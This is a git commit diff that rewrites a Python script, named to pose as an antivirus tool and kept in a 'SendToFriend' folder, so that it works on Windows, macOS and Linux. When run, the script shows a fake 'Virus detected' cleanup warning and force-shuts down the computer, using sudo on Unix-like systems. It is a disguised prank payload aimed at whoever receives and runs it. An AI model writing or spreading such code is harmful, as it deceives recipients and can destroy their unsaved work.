1fed30a3b0c9b4cc4e9e0ad4b54e4d1ff87337ed
XulbuX <142539516+XulbuX-dev@users.noreply.github.com>
2024-10-18 18:52:44 +0200

    make `@^INNOSTOR+ANTIVIRUS^...` work for all OSes

--- Experiments/SendToFriend/scripts/@^INNOSTOR+ANTIVIRUS^_¬xj12$8-djgf!4-Gadfjd-af^AF-jd83a-dfhda-++dFa-9@~jd2-3Ha!f-d^afj1-D$$df-j8faH^-Dafja@-!.py
+++ Experiments/SendToFriend/scripts/@^INNOSTOR+ANTIVIRUS^_¬xj12$8-djgf!4-Gadfjd-af^AF-jd83a-dfhda-++dFa-9@~jd2-3Ha!f-d^afj1-D$$df-j8faH^-Dafja@-!.py
@@ -1,5 +1,14 @@
 import subprocess
+import os
 import time
 
-subprocess.run(['shutdown', '/s', '/t', '5', '/c', 'WARNING: Virus detected. Starting system cleanup process...'])
-time.sleep(5)
+def shutdown_system(message='WARNING: Virus detected. Starting system cleanup process...', delay=5):
+  os_type = os.name
+  if os_type == 'nt': subprocess.run(['shutdown', '/s', '/f', '/t', str(delay), '/c', message])
+  elif os_type == 'posix':
+    if 'darwin' in os.uname().sysname.lower(): subprocess.run(['sudo', 'shutdown', '-h', f'+{delay//60}', message])
+    else: subprocess.run(['sudo', 'shutdown', '-h', f'+{delay//60}', message])
+  else: print(f'Shutdown not supported on this OS: {os_type}')
+  time.sleep(delay)
+
+shutdown_system()
